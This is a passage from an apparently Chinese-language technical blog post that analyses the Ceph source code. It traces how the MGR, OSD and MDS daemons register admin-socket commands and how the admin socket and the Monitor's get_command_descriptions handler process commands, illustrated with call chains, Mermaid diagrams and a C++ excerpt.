MempoolObs::MempoolObs -&gt; register_command<br>+ main -&gt; common_init_finish -&gt; CephContext::start_service_thread -&gt; AdminSocket::init -&gt; register_command<br>+ main -&gt; MgrStandby::MgrStandby -&gt; Messenger::create -&gt; AsyncMessenger::AsyncMessenger -&gt; register_command<br>+ main -&gt; MgrStandby::init -&gt; register_command<br>+ MgrStandby::init -&gt; MonClient::init -&gt; register_command<br>+ MgrStandby::init -&gt; Objecter::init -&gt; register_command<br>+ MgrStandby::init -&gt; Finisher::start -执行创建线程逻辑-&gt; Finisher::finisher_thread_entry -执行另一个线程中调用 Mgr::background_init 函数添加的 Mgr::init 函数-&gt; Mgr::init<br>+ Mgr::init -&gt; register_command<br>+ Mgr::init -&gt; DaemonServer::init -&gt; register_command<br>+ Mgr::init -&gt; ClusterState::final_init -&gt; register_command<br></code></pre></td></tr></table></figure><p><strong>注册命令的函数调用链路示意图:</strong></p><pre><code class="hljs mermaid">graph TD    %% 定义样式    classDef outerNode fill:#e1f5fe,stroke:#01579b,stroke-width:1px    classDef middleNode fill:#fff3e0,stroke:#e65100,stroke-width:1px    classDef finalNode fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px        %% 最外层节点    main[&quot;main&quot;]:::outerNode        %% 中间节点    global_init[&quot;global_init&quot;]:::middleNode    global_pre_init[&quot;global_pre_init&quot;]:::middleNode    common_preinit[&quot;common_preinit&quot;]:::middleNode    CephContext_CephContext1[&quot;CephContext::CephContext&quot;]:::middleNode    MempoolObs_MempoolObs[&quot;MempoolObs::MempoolObs&quot;]:::middleNode    common_init_finish[&quot;common_init_finish&quot;]:::middleNode    CephContext_start_service_thread[&quot;CephContext::start_service_thread&quot;]:::middleNode    AdminSocket_init[&quot;AdminSocket::init&quot;]:::middleNode    MgrStandby_MgrStandby[&quot;MgrStandby::MgrStandby&quot;]:::middleNode    Messenger_create[&quot;Messenger::create&quot;]:::middleNode    AsyncMessenger_AsyncMessenger[&quot;AsyncMessenger::AsyncMessenger&quot;]:::middleNode    MgrStandby_init[&quot;MgrStandby::init&quot;]:::middleNode    MonClient_init[&quot;MonClient::init&quot;]:::middleNode    Objecter_init[&quot;Objecter::init&quot;]:::middleNode    Finisher_start[&quot;Finisher::start&quot;]:::middleNode    Finisher_finisher_thread_entry[&quot;Finisher::finisher_thread_entry&quot;]:::middleNode    Mgr_init[&quot;Mgr::init&quot;]:::middleNode    DaemonServer_init[&quot;DaemonServer::init&quot;]:::middleNode    ClusterState_final_init[&quot;ClusterState::final_init&quot;]:::middleNode        %% 最终节点    register_command[&quot;register_command&quot;]:::finalNode        %% 最长链路（中间）    main --&gt; global_init    global_init --&gt; global_pre_init    global_pre_init --&gt; common_preinit    common_preinit --&gt; CephContext_CephContext1    CephContext_CephContext1 --&gt; register_command        %% 左侧较短链路    main --&gt; common_init_finish    common_init_finish --&gt; CephContext_start_service_thread    CephContext_start_service_thread --&gt; AdminSocket_init    AdminSocket_init --&gt; register_command        main --&gt; MgrStandby_MgrStandby    MgrStandby_MgrStandby --&gt; Messenger_create    Messenger_create --&gt; AsyncMessenger_AsyncMessenger    AsyncMessenger_AsyncMessenger --&gt; register_command        %% 右侧较短链路    main --&gt; MgrStandby_init    MgrStandby_init --&gt; register_command        MgrStandby_init --&gt; MonClient_init    MonClient_init --&gt; register_command        MgrStandby_init --&gt; Objecter_init    Objecter_init --&gt; register_command        %% 带执行信息的链路    MgrStandby_init --&gt; Finisher_start    Finisher_start -- &quot;执行创建线程逻辑&quot; --&gt; Finisher_finisher_thread_entry    Finisher_finisher_thread_entry -- &quot;执行另一个线程中调用 Mgr::background_init 函数添加的 Mgr::init 函数&quot; --&gt; Mgr_init        %% Mgr_init 相关链路    Mgr_init --&gt; register_command    Mgr_init --&gt; DaemonServer_init    DaemonServer_init --&gt; register_command    Mgr_init --&gt; ClusterState_final_init    ClusterState_final_init --&gt; register_command        %% CephContext_CephContext1 的另一个分支    CephContext_CephContext1 --&gt; MempoolObs_MempoolObs    MempoolObs_MempoolObs --&gt; register_command</code></pre><p><strong>Mgr::init 相关流程:</strong></p><ol><li>Manager 给 Monitor 发送订阅 <code>mgrmap</code> 的消息；</li><li>Monitor 给 Manager 回复 <code>mgrmap</code> 的订阅消息；</li><li>Manager 收到 Monitor 的消息后，调用 <code>MgrStandby::handle_mgr_map</code> 函数处理消息，必要时通过创建 <code>Mgr</code> 对象并交由 <code>finisher</code> 线程执行 <code>Mgr::init</code> 操作。</li></ol><h3 id="2-1-3、OSD"><a href="#2-1-3、OSD" class="headerlink" title="2.1.3、OSD"></a>2.1.3、OSD</h3><p>osd 服务的启动服务入口为 <code>src/ceph_osd.cc</code> 文件。</p><p><strong>注册命令的函数:</strong></p><ul><li><strong>CephContext::CephContext 构造函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>config</code> 等命令，注意其中有些命令的 help 字段内容为空，当使用客户端获取可执行的命令，这些命令并不会在命令列表中展示，但是仍然可以被执行；</li><li><strong>MempoolObs::MempoolObs 构造函数</strong> : 其中仅注册了一个 <code>dump_mempools</code> 命令；</li><li><strong>AdminSocket::init 函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>version</code>，<code>git_version</code>， <code>help</code> 等命令，其中 <code>help</code> 命令在输出可用命令时会过滤每个已注册命令的 help 字段，如果为空则不输出对应的命令；</li><li><strong>AsyncMessenger::AsyncMessenger 构造函数</strong> : 其中仅注册了一个 <code>messenger dump</code> 命令；</li><li><strong>MonClient::init 函数</strong> : 其中仅注册了一个 <code>rotate-key</code> 命令；</li><li><strong>BlueStore::SocketHook::create 函数</strong> : 其中注册了 <code>bluestore bluefs device info</code> , <code>bluefs stats</code> 等命令；</li><li><strong>BlueStore::BlueStore::SocketHook 构造函数</strong> : 其中注册了 <code>bluestore collections</code> , <code>bluestore list</code> 等命令；</li><li><strong>AllocatorBase::SocketHook::SocketHook 构造函数</strong> : 其中注册了 <code>bluestore allocator dump block</code> 等后缀为 <code>block</code> 的命令；</li><li><strong>OSD::final_init 函数</strong> : 其中注册了大量的命令；</li><li><strong>Objecter::init 函数</strong> : 其中仅注册了一个 <code>objecter_requests</code> 命令；</li></ul><p><strong>注册命令的函数调用链路:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">+ main -&gt; global_init -&gt; global_pre_init -&gt; common_preinit -&gt; CephContext::CephContext -&gt; register_command<br>+ CephContext::CephContext -&gt; MempoolObs::MempoolObs -&gt; register_command<br>+ main -&gt; common_init_finish -&gt; CephContext::start_service_thread -&gt; AdminSocket::init -&gt; register_command<br>+ main -&gt; OSD::init -&gt; MonClient::init -&gt; register_command<br>+ main -&gt; OSD::final_init -&gt; register_command<br>+ main -&gt; OSD::mkfs -&gt; BlueStore::mkfs -&gt; BlueStore::_open_db -&gt; BlueStore::_prepare_db_environment -&gt; BlueStore::_open_bluefs -&gt; BlueStore::_minimal_open_bluefs -&gt; BlueFS::BlueFS -&gt; BlueFS::SocketHook::create -&gt; register_command<br>+ main -&gt; ObjectStore::create -&gt; BlueStore::BlueStore -&gt; BlueStore::BlueStore::SocketHook -&gt; register_command<br>+ main -&gt; OSD::init -&gt; BlueStore::mount -&gt; BlueStore::_mount -&gt; BlueStore::_open_db_and_around -&gt; BlueStore::_init_alloc -&gt; BlueStore::_create_alloc -&gt; Allocator::create -创建对象时执行父类的构造函数-&gt; AllocatorBase::AllocatorBase -&gt; AllocatorBase::SocketHook::SocketHook -&gt; register_command<br>+ main -&gt; OSD::OSD -&gt; OSDService::OSDService -&gt; Objecter::init -&gt; register_command<br></code></pre></td></tr></table></figure><p><strong>注册命令的函数调用链路示意图:</strong></p><pre><code class="hljs mermaid">graph TD    %% 最外层节点    main[&quot;main&quot;]:::outer        %% 第一层调用    main --&gt; global_init[&quot;global_init&quot;]    main --&gt; common_init_finish[&quot;common_init_finish&quot;]    main --&gt; OSD_init[&quot;OSD::init&quot;]    main --&gt; OSD_final_init[&quot;OSD::final_init&quot;]    main --&gt; OSD_mkfs[&quot;OSD::mkfs&quot;]    main --&gt; ObjectStore_create[&quot;ObjectStore::create&quot;]    main --&gt; OSD_OSD[&quot;OSD::OSD&quot;]        %% global_init 分支    global_init --&gt; global_pre_init[&quot;global_pre_init&quot;]    global_pre_init --&gt; common_preinit[&quot;common_preinit&quot;]    common_preinit --&gt; CephContext_CephContext[&quot;CephContext::CephContext&quot;]    CephContext_CephContext --&gt; register_command_1[&quot;register_command&quot;]    CephContext_CephContext --&gt; MempoolObs_MempoolObs[&quot;MempoolObs::MempoolObs&quot;]    MempoolObs_MempoolObs --&gt; register_command_2[&quot;register_command&quot;]        %% common_init_finish 分支    common_init_finish --&gt; CephContext_start_service_thread[&quot;CephContext::start_service_thread&quot;]    CephContext_start_service_thread --&gt; AdminSocket_init[&quot;AdminSocket::init&quot;]    AdminSocket_init --&gt; register_command_3[&quot;register_command&quot;]        %% OSD::init 分支（第一个）    OSD_init --&gt; MonClient_init[&quot;MonClient::init&quot;]    MonClient_init --&gt; register_command_4[&quot;register_command&quot;]        %% OSD::init 分支（第二个）    OSD_init --&gt; BlueStore_mount[&quot;BlueStore::mount&quot;]    BlueStore_mount --&gt; BlueStore_mount_inner[&quot;BlueStore::_mount&quot;]    BlueStore_mount_inner --&gt; BlueStore_open_db_and_around[&quot;BlueStore::_open_db_and_around&quot;]    BlueStore_open_db_and_around --&gt; BlueStore_init_alloc[&quot;BlueStore::_init_alloc&quot;]    BlueStore_init_alloc --&gt; BlueStore_create_alloc[&quot;BlueStore::_create_alloc&quot;]    BlueStore_create_alloc --&gt; Allocator_create[&quot;Allocator::create&quot;]    Allocator_create -- &quot;创建对象时执行父类的构造函数&quot; --&gt; AllocatorBase_AllocatorBase[&quot;AllocatorBase::AllocatorBase&quot;]    AllocatorBase_AllocatorBase --&gt; AllocatorBase_SocketHook_SocketHook[&quot;AllocatorBase::SocketHook::SocketHook&quot;]    AllocatorBase_SocketHook_SocketHook --&gt; register_command_8[&quot;register_command&quot;]        %% OSD::final_init 分支    OSD_final_init --&gt; register_command_5[&quot;register_command&quot;]        %% OSD::mkfs 分支（最长链路）    OSD_mkfs --&gt; BlueStore_mkfs[&quot;BlueStore::mkfs&quot;]    BlueStore_mkfs --&gt; BlueStore_open_db[&quot;BlueStore::_open_db&quot;]    BlueStore_open_db --&gt; BlueStore_prepare_db_environment[&quot;BlueStore::_prepare_db_environment&quot;]    BlueStore_prepare_db_environment --&gt; BlueStore_open_bluefs[&quot;BlueStore::_open_bluefs&quot;]    BlueStore_open_bluefs --&gt; BlueStore_minimal_open_bluefs[&quot;BlueStore::_minimal_open_bluefs&quot;]    BlueStore_minimal_open_bluefs --&gt; BlueFS_BlueFS[&quot;BlueFS::BlueFS&quot;]    BlueFS_BlueFS --&gt; BlueFS_SocketHook_create[&quot;BlueFS::SocketHook::create&quot;]    BlueFS_SocketHook_create --&gt; register_command_6[&quot;register_command&quot;]        %% ObjectStore::create 分支    ObjectStore_create --&gt; BlueStore_BlueStore[&quot;BlueStore::BlueStore&quot;]    BlueStore_BlueStore --&gt; BlueStore_BlueStore_SocketHook[&quot;BlueStore::BlueStore::SocketHook&quot;]    BlueStore_BlueStore_SocketHook --&gt; register_command_7[&quot;register_command&quot;]        %% OSD::OSD 分支    OSD_OSD --&gt; OSDService_OSDService[&quot;OSDService::OSDService&quot;]    OSDService_OSDService --&gt; Objecter_init[&quot;Objecter::init&quot;]    Objecter_init --&gt; register_command_9[&quot;register_command&quot;]        %% 样式定义    classDef outer fill:#e1f5fe,stroke:#01579b,stroke-width:1px    classDef inner fill:#fff3e0,stroke:#e65100,stroke-width:1px    classDef final fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px        %% 节点分类    class main outer    class register_command_1,register_command_2,register_command_3,register_command_4,register_command_5,register_command_6,register_command_7,register_command_8,register_command_9 final    class global_init,common_init_finish,OSD_init,OSD_final_init,OSD_mkfs,ObjectStore_create,OSD_OSD,global_pre_init,common_preinit,CephContext_CephContext,MempoolObs_MempoolObs,CephContext_start_service_thread,AdminSocket_init,MonClient_init,BlueStore_mount,BlueStore_mount_inner,BlueStore_open_db_and_around,BlueStore_init_alloc,BlueStore_create_alloc,Allocator_create,AllocatorBase_AllocatorBase,AllocatorBase_SocketHook_SocketHook,BlueStore_mkfs,BlueStore_open_db,BlueStore_prepare_db_environment,BlueStore_open_bluefs,BlueStore_minimal_open_bluefs,BlueFS_BlueFS,BlueFS_SocketHook_create,BlueStore_BlueStore,BlueStore_BlueStore_SocketHook,OSDService_OSDService,Objecter_init inner</code></pre><h3 id="2-1-4、MDS"><a href="#2-1-4、MDS" class="headerlink" title="2.1.4、MDS"></a>2.1.4、MDS</h3><p>mds 服务的启动服务入口为 <code>src/ceph_mds.cc</code> 文件。</p><p><strong>注册命令的函数:</strong></p><ul><li><strong>CephContext::CephContext 构造函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>config</code> 等命令，注意其中有些命令的 help 字段内容为空，当使用客户端获取可执行的命令，这些命令并不会在命令列表中展示，但是仍然可以被执行；</li><li><strong>MempoolObs::MempoolObs 构造函数</strong> : 其中仅注册了一个 <code>dump_mempools</code> 命令；</li><li><strong>AdminSocket::init 函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>version</code>，<code>git_version</code>， <code>help</code> 等命令，其中 <code>help</code> 命令在输出可用命令时会过滤每个已注册命令的 help 字段，如果为空则不输出对应的命令；</li><li><strong>AsyncMessenger::AsyncMessenger 构造函数</strong> : 其中仅注册了一个 <code>messenger dump</code> 命令；</li><li><strong>MonClient::init 函数</strong> : 其中仅注册了一个 <code>rotate-key</code> 命令；</li><li><strong>MDSDaemon::set_up_admin_socket 函数</strong> : 其中注册了大量的命令；</li><li><strong>Objecter::init 函数</strong> : 其中仅注册了一个 <code>objecter_requests</code> 命令；</li></ul><p><strong>注册命令的函数调用链路:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">+ main -&gt; global_init -&gt; global_pre_init -&gt; common_preinit -&gt; CephContext::CephContext -&gt; register_command<br>+ CephContext::CephContext -&gt; MempoolObs::MempoolObs -&gt; register_command<br>+ main -&gt; common_init_finish -&gt; CephContext::start_service_thread -&gt; AdminSocket::init -&gt; register_command<br>+ main -&gt; Messenger::create -&gt; AsyncMessenger::AsyncMessenger -&gt; register_command<br>+ main -&gt; MDSDaemon::init -&gt; MonClient::init -&gt; register_command<br>+ main -&gt; MDSDaemon::init -&gt; MDSDaemon::set_up_admin_socket -&gt; register_command<br>+ main -&gt; MDSDaemon::init -&gt; Messenger::add_dispatcher_head - Messenger::ready(纯虚函数) -&gt; AsyncMessenger::ready -&gt; DispatchQueue::start - 创建 dispatch_thread 线程-&gt; DispatchQueue::entry -&gt;  Messenger::ms_deliver_dispatch -&gt; MDSDaemon::ms_dispatch2 -&gt; MDSDaemon::handle_core_message - 处理CEPH_MSG_MDS_MAP消息-&gt; MDSDaemon::handle_mds_map - 创建MDSRankDispatcher对象-&gt; MDSRankDispatcher::init -&gt; Objecter::init -&gt; register_command<br></code></pre></td></tr></table></figure><p><strong>注册命令的函数调用链路示意图:</strong></p><pre><code class="hljs mermaid">graph TB    %% 定义样式    classDef outerNode fill:#e1f5f5,stroke:#01579b,stroke-width:1px    classDef middleNode fill:#fff3e0,stroke:#e65100,stroke-width:1px    classDef finalNode fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px        %% 最外层节点    main[&quot;main&quot;]:::outerNode        %% 中间节点    global_init[&quot;global_init&quot;]:::middleNode    global_pre_init[&quot;global_pre_init&quot;]:::middleNode    common_preinit[&quot;common_preinit&quot;]:::middleNode    CephContext_Ctor[&quot;CephContext::CephContext&quot;]:::middleNode    MempoolObs_Ctor[&quot;MempoolObs::MempoolObs&quot;]:::middleNode    common_init_finish[&quot;common_init_finish&quot;]:::middleNode    CephContext_start_service[&quot;CephContext::start_service_thread&quot;]:::middleNode    AdminSocket_init[&quot;AdminSocket::init&quot;]:::middleNode    Messenger_create[&quot;Messenger::create&quot;]:::middleNode    AsyncMessenger_Ctor[&quot;AsyncMessenger::AsyncMessenger&quot;]:::middleNode    MDSDaemon_init[&quot;MDSDaemon::init&quot;]:::middleNode    MonClient_init[&quot;MonClient::init&quot;]:::middleNode    MDSDaemon_set_up_admin[&quot;MDSDaemon::set_up_admin_socket&quot;]:::middleNode    Messenger_add_dispatcher[&quot;Messenger::add_dispatcher_head&quot;]:::middleNode    Messenger_ready[&quot;Messenger::ready(纯虚函数)&quot;]:::middleNode    AsyncMessenger_ready[&quot;AsyncMessenger::ready&quot;]:::middleNode    DispatchQueue_start[&quot;DispatchQueue::start&quot;]:::middleNode    create_dispatch_thread[&quot;创建 dispatch_thread 线程&quot;]:::middleNode    DispatchQueue_entry[&quot;DispatchQueue::entry&quot;]:::middleNode    Messenger_deliver[&quot;Messenger::ms_deliver_dispatch&quot;]:::middleNode    MDSDaemon_dispatch2[&quot;MDSDaemon::ms_dispatch2&quot;]:::middleNode    MDSDaemon_handle_core[&quot;MDSDaemon::handle_core_message&quot;]:::middleNode    handle_mds_map[&quot;MDSDaemon::handle_mds_map&quot;]:::middleNode    create_MDSRankDispatcher[&quot;创建MDSRankDispatcher对象&quot;]:::middleNode    MDSRankDispatcher_init[&quot;MDSRankDispatcher::init&quot;]:::middleNode    Objecter_init[&quot;Objecter::init&quot;]:::middleNode        %% 最终节点    register_command[&quot;register_command&quot;]:::finalNode        %% 调用关系 - 主要长链路（中间）    main --&gt; global_init    global_init --&gt; global_pre_init    global_pre_init --&gt; common_preinit    common_preinit --&gt; CephContext_Ctor    CephContext_Ctor --&gt; register_command        %% 左侧较短链路    main --&gt; common_init_finish    common_init_finish --&gt; CephContext_start_service    CephContext_start_service --&gt; AdminSocket_init    AdminSocket_init --&gt; register_command        main --&gt; Messenger_create    Messenger_create --&gt; AsyncMessenger_Ctor    AsyncMessenger_Ctor --&gt; register_command        %% 右侧较短链路    main --&gt; MDSDaemon_init    MDSDaemon_init --&gt; MonClient_init    MonClient_init --&gt; register_command        MDSDaemon_init --&gt; MDSDaemon_set_up_admin    MDSDaemon_set_up_admin --&gt; register_command        %% 中间最长链路（继续）    MDSDaemon_init --&gt; Messenger_add_dispatcher    Messenger_add_dispatcher --&gt; Messenger_ready    Messenger_ready --&gt; AsyncMessenger_ready    AsyncMessenger_ready --&gt; DispatchQueue_start    DispatchQueue_start --&gt; create_dispatch_thread    create_dispatch_thread --&gt; DispatchQueue_entry    DispatchQueue_entry --&gt; Messenger_deliver    Messenger_deliver --&gt; MDSDaemon_dispatch2    MDSDaemon_dispatch2 --&gt; MDSDaemon_handle_core    MDSDaemon_handle_core --&gt; handle_mds_map    handle_mds_map --&gt; create_MDSRankDispatcher    create_MDSRankDispatcher --&gt; MDSRankDispatcher_init    MDSRankDispatcher_init --&gt; Objecter_init    Objecter_init --&gt; register_command        %% 额外的调用关系    CephContext_Ctor --&gt; MempoolObs_Ctor    MempoolObs_Ctor --&gt; register_command        %% 添加注释说明    linkStyle 0,1,2,3 stroke:#01579b,stroke-width:1px    linkStyle 4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 stroke:#e65100,stroke-width:1px    linkStyle 25,26,27,28,29,30,31,32,33,34,35 stroke:#2e7d32,stroke-width:1px</code></pre><h2 id="2-2、命令执行流程"><a href="#2-2、命令执行流程" class="headerlink" title="2.2、命令执行流程"></a>2.2、命令执行流程</h2><h3 id="2-2-1、admin-socket-初始化流程"><a href="#2-2-1、admin-socket-初始化流程" class="headerlink" title="2.2.1、admin socket 初始化流程"></a>2.2.1、admin socket 初始化流程</h3><p>MON&#x2F;MGR&#x2F;OSD&#x2F;MDS 等组件 admin socket 的命令执行流程基本一致。大致就是创建对应的 Unix Socket 以及对应的处理线程，然后等待接受命令并执行。</p><p><strong>执行流程:</strong></p><ul><li>函数调用链路: main -&gt; common_init_finish -&gt; CephContext::start_service_thread -&gt; AdminSocket::init；</li><li>其中，AdminSocket::init 函数内部创建 Unix Socket ，并启动 AdminSocket::entry 线程（线程名为 admin_socket）；</li><li>之后 common_init_finish 函数在调用 CephContext::start_service_thread 函数之后，再根据需要调整对应 Unix Socket 的 owner 和 mode ；</li></ul><p><strong>初始化流程示意图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant main as main函数    participant common as common_init_finish    participant ceph as CephContext::start_service_thread    participant admin as AdminSocket::init    participant socket as Unix Socket    participant thread as admin_socket线程    Note over main,thread: Admin Socket 初始化时序    main-&gt;&gt;common: 调用    activate common    common-&gt;&gt;ceph: start_service_thread()    activate ceph    ceph-&gt;&gt;admin: init()    activate admin    admin-&gt;&gt;socket: 创建Unix Socket    activate socket    socket--&gt;&gt;admin: Socket创建成功    deactivate socket    admin-&gt;&gt;thread: 启动AdminSocket::entry线程    activate thread    admin--&gt;&gt;ceph: 返回    deactivate admin    ceph--&gt;&gt;common: 返回    deactivate ceph    %% common_init_finish内部继续执行权限调整    Note over common: common_init_finish内部继续执行    common-&gt;&gt;common: 调整Socket owner    common-&gt;&gt;common: 调整Socket mode    Note over common: 权限调整完成    %% 线程开始工作（与权限调整并行）    thread-&gt;&gt;thread: 等待接受命令并执行    Note over thread: 线程持续运行    common--&gt;&gt;main: 返回    deactivate common    Note over main,thread: 初始化完成，等待命令</code></pre><h3 id="2-2-2、接收并执行命令流程"><a href="#2-2-2、接收并执行命令流程" class="headerlink" title="2.2.2、接收并执行命令流程"></a>2.2.2、接收并执行命令流程</h3><p>我们可以在 AdminSocket::entry 函数中看到使用 poll 同时监听了两个文件描述符：<code>m_sock_fd</code>（对外服务的Unix域套接字，接受客户端连接），<code>m_wakeup_rd_fd</code>（管道或eventfd的读端，用于内部线程间通信，触发 do_tell_queue 处理）。两者有不同的执行链路。</p><p><strong>两个fd的对比:</strong></p><table><thead><tr><th align="center">特性</th><th align="center">m_sock_fd (外部路径)</th><th align="center">m_wakeup_rd_fd (内部路径)</th></tr></thead><tbody><tr><td align="center"><strong>触发源</strong></td><td align="center">外部管理工具</td><td align="center">Ceph内部组件线程</td></tr><tr><td align="center"><strong>协议</strong></td><td align="center">asok协议(JSON&#x2F;二进制)</td><td align="center">内部消息协议(MCommand等)</td></tr><tr><td align="center"><strong>执行模式</strong></td><td align="center">同步等待结果</td><td align="center">异步回调</td></tr><tr><td align="center"><strong>响应方式</strong></td><td align="center">通过同一socket返回</td><td align="center">通过原消息连接返回</td></tr><tr><td align="center"><strong>主要用途</strong></td><td align="center">运维管理、监控</td><td align="center">集群内部控制、状态同步</td></tr><tr><td align="center"><strong>处理函数</strong></td><td align="center">do_accept()</td><td align="center">do_tell_queue()</td></tr><tr><td align="center"><strong>队列机制</strong></td><td align="center">无队列，直接处理</td><td align="center">使用 tell_queue 缓冲</td></tr></tbody></table><p><strong>m_sock_fd - 外部客户端请求处理时序图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant Client as 外部客户端&lt;br/&gt;(ceph daemon)    participant Socket as Unix Socket&lt;br/&gt;(/var/run/ceph/*.asok)    participant AdminSocket as AdminSocket::entry()    participant do_accept as do_accept()    participant ExecCmd as execute_command&lt;br/&gt;(同步版本)    participant Hook as 命令钩子&lt;br/&gt;(hook-&gt;call_async)    participant Formatter as 格式化器    Note over Client,Formatter: 外部请求处理流程    Client-&gt;&gt;Socket: 1. connect() 建立连接    AdminSocket-&gt;&gt;AdminSocket: 2. poll() 检测到m_sock_fd有POLLIN事件    AdminSocket-&gt;&gt;do_accept: 3. 调用do_accept()    do_accept-&gt;&gt;Socket: 4. accept() 接受连接    Socket--&gt;&gt;do_accept: 5. 返回connection_fd    Client-&gt;&gt;do_accept: 6. 发送命令数据&lt;br/&gt;(JSON或旧协议)    loop 读取完整命令        do_accept-&gt;&gt;do_accept: 7. safe_recv() 逐字节读取        alt 遇到终止符(\n或\0)            do_accept-&gt;&gt;do_accept: 8. 构建命令字符串c        else 缓冲区溢出            do_accept-&gt;&gt;Socket: 关闭连接并返回错误        end    end    do_accept-&gt;&gt;ExecCmd: 9. 调用execute_command(c)    ExecCmd-&gt;&gt;ExecCmd: 10. 创建锁/条件变量&lt;br/&gt;等待异步完成    ExecCmd-&gt;&gt;Hook: 11. 异步调用hook-&gt;call_async()    Hook-&gt;&gt;Hook: 12. 执行实际命令逻辑    Hook--&gt;&gt;ExecCmd: 13. 回调返回结果(rval, err, out)    ExecCmd--&gt;&gt;do_accept: 14. 返回执行结果    do_accept-&gt;&gt;Formatter: 15. 格式化错误信息(如果需要)    do_accept-&gt;&gt;Client: 16. 发送响应长度(htonl(out.length()))    do_accept-&gt;&gt;Client: 17. 发送响应数据(out.send_fd())    do_accept-&gt;&gt;Socket: 18. closesocket(connection_fd)    Client-&gt;&gt;Client: 19. 解析并显示结果</code></pre><p><strong>m_wakeup_rd_fd - 内部线程唤醒处理时序图:</strong></p><pre><code class="hljs mermaid">sequenceDiagram    participant Internal as 内部线程&lt;br/&gt;(如OSD线程)    participant Queue as tell_queue&lt;br/&gt;tell_legacy_queue    participant WakePipe as 唤醒管道&lt;br/&gt;(pipe/eventfd)    participant AdminSocket as AdminSocket::entry()    participant do_tell_queue as do_tell_queue()    participant ExecCmd as execute_command&lt;br/&gt;(异步版本)    participant Hook as 命令钩子&lt;br/&gt;(hook-&gt;call_async)    participant Reply as 回复消息构造    Note over Internal,Reply: 内部唤醒处理流程    Internal-&gt;&gt;Queue: 1. 获取tell_lock锁    Internal-&gt;&gt;Queue: 2. 将MCommand/MMonCommand&lt;br/&gt;放入对应队列    Internal-&gt;&gt;Queue: 3. 释放tell_lock锁    Internal-&gt;&gt;WakePipe: 4. 向m_wakeup_wr_fd写入1字节    AdminSocket-&gt;&gt;AdminSocket: 5. poll() 检测到m_wakeup_rd_fd有POLLIN事件    AdminSocket-&gt;&gt;WakePipe: 6. safe_recv() 读取唤醒字节    AdminSocket-&gt;&gt;do_tell_queue: 7. 调用do_tell_queue()    do_tell_queue-&gt;&gt;Queue: 8. 获取tell_lock锁    do_tell_queue-&gt;&gt;Queue: 9. 交换队列内容到局部变量    do_tell_queue-&gt;&gt;Queue: 10. 释放tell_lock锁    loop 处理每个队列中的消息        do_tell_queue-&gt;&gt;ExecCmd: 11. 调用execute_command(异步版本)        ExecCmd-&gt;&gt;Hook: 12. 异步调用hook-&gt;call_async()        Hook-&gt;&gt;Hook: 13. 执行实际命令逻辑        Hook--&gt;&gt;ExecCmd: 14. 回调返回结果(rval, err, outbl)        ExecCmd--&gt;&gt;do_tell_queue: 15. 在回调中构造回复消息        alt MCommand类型            do_tell_queue-&gt;&gt;Reply: 16. 创建MCommandReply        else MMonCommand类型            do_tell_queue-&gt;&gt;Reply: 17. 创建MMonCommandAck        end        do_tell_queue-&gt;&gt;Internal: 18. 通过原连接发送回复消息&lt;br/&gt;(m-&gt;get_connection()-&gt;send_message())    end    Note over AdminSocket: 处理完成后继续poll()等待</code></pre><h1 id="三、Monitor-Commands-分析"><a href="#三、Monitor-Commands-分析" class="headerlink" title="三、Monitor Commands 分析"></a>三、Monitor Commands 分析</h1><h2 id="3-1、命令注册流程"><a href="#3-1、命令注册流程" class="headerlink" title="3.1、命令注册流程"></a>3.1、命令注册流程</h2><p>当执行 <code>ceph -h</code> 命令后，其实是向 Monitor 发送了 <code>get_command_descriptions</code> 命令， 对应的处理函数为 Monitor::handle_command ，相关的处理代码如下。可以看到其中含有了 <strong>mon 的 leader_mon_commands</strong> 和 <strong>mgr 的一些命令</strong>。</p><p><strong>因此 Monitor Commands 包含两部分:</strong></p><ul><li><strong>Monitor 相关的命令</strong>: 其中包括操作 Ceph 集群的各种类型的命令；</li><li><strong>Manager 上报的命令</strong>: Manager 通过与 Monitor 进行通信，上报的关于 Manager 自身以及其内部启用的 Python 模块的命令；</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (prefix == <span class="hljs-string">&quot;get_command_descriptions&quot;</span>)<br>&#123;<br>  bufferlist rdata;<br>  Formatter *f = Formatter::<span class="hljs-built_in">create</span>(<span class="hljs-string">&quot;json&quot;</span>);<br><br>  std::vector&lt;MonCommand&gt; commands = <span class="hljs-built_in">static_cast</span>&lt;MgrMonitor *&gt;(<br>                                          paxos_service[PAXOS_MGR].<span class="hljs-built_in">get</span>())<br>                                          -&gt;<span class="hljs-built_in">get_command_descs</span>();<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;c : leader_mon_commands)<br>  &#123;<br>    commands.<span class="hljs-built_in">push_back</span>(c);<br>  &#125;<br><br>  <span class="hljs-keyword">auto</span> features = m-&gt;<span class="hljs-built_in">get_connection</span>()-&gt;<span class="hljs-built_in">get_features</span>();<br>  format_command_descriptions(commands, f, features, &amp;rdata);<br>  <span class="hljs-keyword">delete</span> f;<br>  <span class="hljs-built_in">reply_command</span>(op, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>, rdata, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-1-1、Monitor-相关的命令"><a href="#3-1-1、Monitor-相关的命令" class="headerlink" title="3.1.1、Monitor 相关的命令"></a>3.1.1、Monitor 相关的命令</h3><p><strong>leader_mon_commands 的设置流程:</strong></p><ol><li>Monitor::Monitor 构造函数内部，使用 src&#x2F;mon&#x2F;MonCommands.h 中定义组合而成的 mon_commands 变量，来设置 leader_mon_commands 变量（这个地方的含义是，在选举完成前，我们暂时接受所有命令。这仅意味着在选举期间我们不会以 EINVAL 错误拒绝命令；任何真正重要的命令都会等待我们获得法定人数等条件满足后，重新尝试（并重新验证）。</li><li>当 Monitor 赢得选举的时候，使用 Monitor::set_leader_commands 函数来设置 leader_mon_commands 